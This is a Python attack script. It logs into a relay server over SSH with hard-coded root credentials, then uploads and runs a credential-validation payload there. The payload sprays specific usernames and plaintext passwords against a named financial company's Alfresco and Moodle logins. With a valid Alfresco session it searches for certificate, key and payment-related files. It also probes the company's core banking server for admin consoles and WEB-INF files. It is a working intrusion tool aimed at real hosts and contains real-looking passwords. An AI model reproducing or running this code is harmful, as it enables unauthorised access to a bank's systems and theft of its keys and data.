import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})

sys.stdout.write("="*60 + "\n")
sys.stdout.write("=== ALFRESCO LOGIN (portafolio.findep.mx) ===\n")
sys.stdout.write("="*60 + "\n\n")

# Alfresco REST API login
creds_alfresco = [
    ("Jjaimesva", "Igual2020*"),
    ("jjaimesva", "Igual2020*"),
    ("admin", "admin"),
    ("admin", "Fisa1234*"),
    ("jcruzval", "Fisa1234*"),
    ("jcruzval", "Fisa1234"),
    ("lmiramontes", "Dipperm8$"),
]

for user, pw in creds_alfresco:
    try:
        r = s.post(
            "https://portafolio.findep.mx/alfresco/s/api/login",
            json={"username": user, "password": pw},
            timeout=10
        )
        sys.stdout.write(f"  {user}:{pw} -> [{r.status_code}] {r.text[:300]}\n")
        if r.status_code == 200 and "ticket" in r.text.lower():
            sys.stdout.write(f"  *** ALFRESCO LOGIN SUCCESS ***\n")
            data = r.json()
            ticket = data.get("data", {}).get("ticket", "")
            sys.stdout.write(f"  TICKET: {ticket}\n\n")
            # List sites
            r2 = s.get(f"https://portafolio.findep.mx/alfresco/s/api/sites?alf_ticket={ticket}", timeout=10)
            sys.stdout.write(f"  Sites: [{r2.status_code}] {r2.text[:500]}\n")
            # List root nodes
            r3 = s.get(f"https://portafolio.findep.mx/alfresco/api/-default-/public/alfresco/versions/1/nodes/-root-/children?alf_ticket={ticket}", timeout=10)
            sys.stdout.write(f"  Root: [{r3.status_code}] {r3.text[:500]}\n")
            # Search for cert files
            for q in ["*.pem", "*.jks", "*.p12", "*.pfx", "*.cer", "*.key", "spei", "stp", "pocc", "certificado"]:
                r4 = s.get(f"https://portafolio.findep.mx/alfresco/api/-default-/public/alfresco/versions/1/queries/nodes?term={q}&alf_ticket={ticket}", timeout=10)
                hits = 0
                try:
                    data4 = r4.json()
                    hits = data4.get("list", {}).get("pagination", {}).get("totalItems", 0)
                except:
                    pass
                sys.stdout.write(f"  Search '{q}': [{r4.status_code}] {hits} results\n")
                if hits > 0:
                    sys.stdout.write(f"    DATA: {r4.text[:600]}\n")
            break
    except Exception as e:
        sys.stdout.write(f"  {user}:{pw} -> ERR: {e}\n")
    sys.stdout.flush()

sys.stdout.write("\n" + "="*60 + "\n")
sys.stdout.write("=== MOODLE LOGIN (universidad.findep.mx) ===\n")
sys.stdout.write("="*60 + "\n\n")

# Moodle login requires CSRF token first
creds_moodle = [
    ("39978189254", "Fisa1234*"),
    ("out_epadillar", "Fisa1234*"),
    ("jcruzval", "Fisa1234*"),
    ("jcruzval", "Fisa1234"),
    ("jriosgonz", "Fisa1234"),
    ("lmiramontes", "727371"),
    ("admin", "Fisa1234*"),
    ("admin", "admin"),
]

for user, pw in creds_moodle:
    try:
        # Get login token
        r_login = s.get("https://universidad.findep.mx/login/index.php", timeout=10)
        import re
        token_match = re.search(r'name="logintoken"\s+value="([^"]+)"', r_login.text)
        if not token_match:
            sys.stdout.write(f"  No logintoken found in login page\n")
            break
        token = token_match.group(1)

        r = s.post(
            "https://universidad.findep.mx/login/index.php",
            data={"anchor": "", "logintoken": token, "username": user, "password": pw, "rememberusername": "1"},
            allow_redirects=False,
            timeout=10
        )
        loc = r.headers.get("Location", "")
        cookies_set = dict(r.cookies)
        is_success = "testsession" in loc or "my/" in loc or r.status_code == 303
        # Check if redirect goes to dashboard vs back to login
        if r.status_code in (301, 302, 303):
            r2 = s.get(loc if loc.startswith("http") else f"https://universidad.findep.mx{loc}", timeout=10, allow_redirects=False)
            final_loc = r2.headers.get("Location", "")
            has_error = "loginerror" in r2.text.lower() or "error" in final_loc.lower() or "login" in final_loc
            sys.stdout.write(f"  {user}:{pw} -> [{r.status_code}] -> {loc[:80]} -> [{r2.status_code}] {final_loc[:80]}\n")
            if not has_error and ("my" in final_loc or "dashboard" in final_loc or r2.status_code == 200):
                sys.stdout.write(f"  *** MOODLE LOGIN SUCCESS ***\n")
        else:
            sys.stdout.write(f"  {user}:{pw} -> [{r.status_code}] {len(r.text)}b\n")
    except Exception as e:
        sys.stdout.write(f"  {user}:{pw} -> ERR: {e}\n")
    sys.stdout.flush()

sys.stdout.write("\n" + "="*60 + "\n")
sys.stdout.write("=== CORE BANKING (core.findep.mx GlassFish) ===\n")
sys.stdout.write("="*60 + "\n\n")

# First, find the actual login URL
try:
    r = s.get("https://core.findep.mx/", timeout=10)
    # Look for form action
    forms = re.findall(r'action="([^"]*)"', r.text)
    inputs = re.findall(r'<input[^>]+name="([^"]*)"', r.text)
    sys.stdout.write(f"  Homepage forms: {forms[:10]}\n")
    sys.stdout.write(f"  Homepage inputs: {inputs[:20]}\n")
    # Look for login-related links
    links = re.findall(r'href="([^"]*(?:login|auth|session)[^"]*)"', r.text, re.I)
    sys.stdout.write(f"  Login links: {links[:10]}\n")
    sys.stdout.flush()
except Exception as e:
    sys.stdout.write(f"  ERR homepage: {e}\n")

# Try known Struts paths  
for path in [
    "/CaptchaImage", "/verificarUsuario.do", "/loginValidacion.do",
    "/j_security_check", "/j_spring_security_check",
    "/SifMovil/", "/SifMovil/login", "/SifMovil/inicio.jsp",
    "/sifmovil/", "/sif/", "/admin/", "/console/",
    "/manager/html", "/faces/", "/jsf/",
    "/WEB-INF/web.xml", "/WEB-INF/classes/",
]:
    try:
        r = s.get(f"https://core.findep.mx{path}", timeout=5, allow_redirects=False)
        if r.status_code != 404:
            sys.stdout.write(f"  [{r.status_code}] {path} ({len(r.text)}b)\n")
            if r.status_code == 200 and len(r.text) > 50:
                sys.stdout.write(f"    BODY: {repr(r.text[:300])}\n")
    except:
        pass
    sys.stdout.flush()

sys.stdout.write("\n=== DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/validate_creds.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/validate_creds.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Done.', flush=True)
